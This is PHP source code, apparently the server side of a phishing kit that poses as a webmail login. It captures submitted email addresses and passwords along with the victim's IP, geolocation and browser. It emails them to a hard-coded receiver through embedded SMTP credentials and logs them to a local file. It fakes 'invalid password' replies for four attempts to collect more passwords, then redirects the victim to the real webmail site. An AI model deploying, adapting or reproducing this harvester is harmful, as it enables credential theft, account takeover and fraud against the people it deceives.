<?php
require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    exit(0);
}

// Get client IP and location data
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

session_start();

// Block GET requests with HTML response
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    print '
    <html>
        <head>
            <title>403 - Forbidden</title>
        </head>
        <body>
            <h1>403 Forbidden</h1>
            <p>Access denied</p>
            <hr>
        </body>
    </html>';
    exit;
}

//----------------------------------------------------------\\
// SMTP Configuration
$receiver = "bobrob@elitat.com"; // ENTER YOUR EMAIL HERE
$senderuser = "jered@globalrisk.ru"; // ENTER YOUR SMTP USER
$senderpass = "global.321"; // ENTER YOUR SMTP PASSWORD
$senderport = "587"; // ENTER YOUR SMTP PORT
$senderserver = "mail.globalrisk.ru"; // ENTER YOUR SMTP SERVER
//----------------------------------------------------------\\

// Get form data and browser info
$browser = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$email = $login;

// Validate input
if (empty($login) || empty($password)) {
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'Email and password are required'
    ]);
    exit;
}

// Extract domain from email
$parts = explode("@", $email);
$domain = isset($parts[1]) ? $parts[1] : 'unknown';

// Initialize or get attempt counter for this session/IP
$attempt_key = 'login_attempts_' . md5($ip . $email);
if (!isset($_SESSION[$attempt_key])) {
    $_SESSION[$attempt_key] = 0;
}
$_SESSION[$attempt_key]++;
$current_attempt = $_SESSION[$attempt_key];

// Prepare email subjects
$subg = ($ipdat->geoplugin_countryName ?? 'Unknown') . " || " . $login . " || Attempt #" . $current_attempt;
$subg2 = "LoginAttempt || " . ($ipdat->geoplugin_countryName ?? 'Unknown') . " || " . $login . " || #" . $current_attempt;

// Prepare message content
$country = $ipdat->geoplugin_countryName ?? 'Unknown';
$city = $ipdat->geoplugin_city ?? 'Unknown';
$message = "Email: " . $login . "\n";
$message .= "Password: " . $password . "\n";
$message .= "Attempt: #" . $current_attempt . "\n";
$message .= "IP: " . $ip . "\n";
$message .= "Location: " . $country . " | " . $city . "\n";
$message .= "Browser: " . $browser . "\n";
$message .= "Domain: " . $domain . "\n";
$message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
$message .= "-----------------------------------\n";

// Check if this is the 5th attempt - redirect instead of processing
if ($current_attempt >= 5) {
    // Reset attempt counter
    unset($_SESSION[$attempt_key]);
    
    // Log the redirect attempt
    $fp = fopen("SS-Or.txt", "a");
    fputs($fp, "REDIRECT (5th attempt): " . $message);
    fclose($fp);
    
    // Return redirect response
    echo json_encode([
        'signal' => 'OK',
        'success' => true,
        'msg' => 'Login successful! Redirecting to webmail...',
        'redirect_url' => 'https://webmail.' . $domain,
        'attempt' => $current_attempt
    ]);
    exit;
}

// For attempts 1-4, always send email and return "invalid" response
try {
    // Send email notification
    $mail = new PHPMailer;
    $mail->isSMTP();
    $mail->Host = $senderserver;
    $mail->SMTPAuth = true;
    $mail->Username = $senderuser;
    $mail->Password = $senderpass;
    $mail->Port = $senderport;
    $mail->From = $senderuser;
    $mail->FromName = 'WebmailLogger';
    $mail->addAddress($receiver);
    $mail->isHTML(true);
    $mail->Subject = $subg2;
    $mail->Body = nl2br($message);
    $mail->AltBody = strip_tags($message);
    
    $mail_sent = $mail->send();
    
} catch (Exception $e) {
    error_log("Mail sending failed: " . $e->getMessage());
    $mail_sent = false;
}

// Log to file regardless of email success
$fp = fopen("SS-Or.txt", "a");
fputs($fp, $message);
fclose($fp);

// Always return "invalid" response for attempts 1-4
$response = [
    'signal' => 'not ok',
    'success' => false,
    'msg' => 'Invalid email or password. Please try again. (Attempt ' . $current_attempt . '/4)',
    'attempt' => $current_attempt,
    'max_attempts' => 4
];

echo json_encode($response);
exit();
?>